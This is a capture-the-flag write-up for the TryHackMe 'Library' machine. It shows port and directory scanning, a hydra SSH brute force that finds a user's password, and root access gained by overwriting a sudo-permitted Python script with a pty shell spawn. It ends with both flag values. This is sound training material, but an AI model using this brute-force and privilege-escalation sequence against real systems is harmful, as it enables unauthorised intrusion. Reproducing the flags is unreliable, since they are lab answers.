# Library

boot2root machine for FIT and bsides guatemala CTF

[Library](https://tryhackme.com/room/bsidesgtlibrary)

## Topic's

* Network Enumeration
* Web Enumeration
* Web Poking
* Brute Forcing (SSH)
* Misconfigured Binaries
* Python Scripting (Rev Shell)

## Task 1 Library

Read user.txt and root.txt

```
kali@kali:~/CTFs/tryhackme/Library$ sudo nmap -A -sS -sC -sV -O 10.10.163.174
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 16:59 CEST
Nmap scan report for 10.10.163.174
Host is up (0.065s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=44597%PV=Y%DS=2%DC=T%G=Y%TM=5F8712
OS:8D%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   68.47 ms 10.8.0.1
2   68.58 ms 10.10.163.174

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.05 seconds
```

```
kali@kali:~/CTFs/tryhackme/Library$ sudo /opt/dirsearch/dirsearch.py -u 10.10.163.174 -w /usr/share/dirb/wordlists/common.txt -e html,php
[sudo] password for kali: 

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: html, php | HTTP method: GET | Threads: 20 | Wordlist size: 4613

Error Log: /opt/dirsearch/logs/errors-20-10-14_17-00-31.log

Target: 10.10.163.174

Output File: /opt/dirsearch/reports/10.10.163.174/_20-10-14_17-00-31.txt

[17:00:31] Starting: 
[17:00:39] 301 -  315B  - /images  ->  http://10.10.163.174/images/
[17:00:39] 200 -    5KB - /index.html
[17:00:42] 200 -   33B  - /robots.txt
[17:00:43] 403 -  301B  - /server-status

Task Completed
```

[http://10.10.163.174/robots.txt](http://10.10.163.174/robots.txt)

```
User-agent: rockyou 
Disallow: /
```

```
meliodas
root
www-data
Anonymous
```

```
kali@kali:~/CTFs/tryhackme/Library$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.163.174
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-14 17:04:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.163.174:22/
[STATUS] 179.00 tries/min, 179 tries in 00:01h, 14344223 to do in 1335:36h, 16 active
[22][ssh] host: 10.10.163.174   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-14 17:05:43
```

```
kali@kali:~/CTFs/tryhackme/Library$ ssh meliodas@10.10.163.174
The authenticity of host '10.10.163.174 (10.10.163.174)' can't be established.
ECDSA key fingerprint is SHA256:sKxkgmnt79RkNN7Tn25FLA0EHcu3yil858DSdzrX4Dc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.163.174' (ECDSA) to the list of known hosts.
meliodas@10.10.163.174's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
meliodas@ubuntu:~$ ls
bak.py  user.txt
meliodas@ubuntu:~$ cat user.txt
6d488cbb3f111d135722c33cb635f4ec
```

```
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
meliodas@ubuntu:~$ cat bak.py 
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
meliodas@ubuntu:~$ ls -la
total 40
drwxr-xr-x 4 meliodas meliodas 4096 Aug 24  2019 .
drwxr-xr-x 3 root     root     4096 Aug 23  2019 ..
-rw-r--r-- 1 root     root      353 Aug 23  2019 bak.py
-rw------- 1 root     root       44 Aug 23  2019 .bash_history
-rw-r--r-- 1 meliodas meliodas  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 meliodas meliodas 3771 Aug 23  2019 .bashrc
drwx------ 2 meliodas meliodas 4096 Aug 23  2019 .cache
drwxrwxr-x 2 meliodas meliodas 4096 Aug 23  2019 .nano
-rw-r--r-- 1 meliodas meliodas  655 Aug 23  2019 .profile
-rw-r--r-- 1 meliodas meliodas    0 Aug 23  2019 .sudo_as_admin_successful
-rw-rw-r-- 1 meliodas meliodas   33 Aug 23  2019 user.txt
meliodas@ubuntu:~$ rm -f bak.py
meliodas@ubuntu:~$ cat > bak.py << EOF
> #!/usr/bin/env python
> import pty
> pty.spawn("/bin/bash")
> EOF
meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
root@ubuntu:~# cd /root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt
e8c8c6c256c35515d1d344ee0488c617
```

1. user.txt

`6d488cbb3f111d135722c33cb635f4ec`

2. root.txt

`e8c8c6c256c35515d1d344ee0488c617`
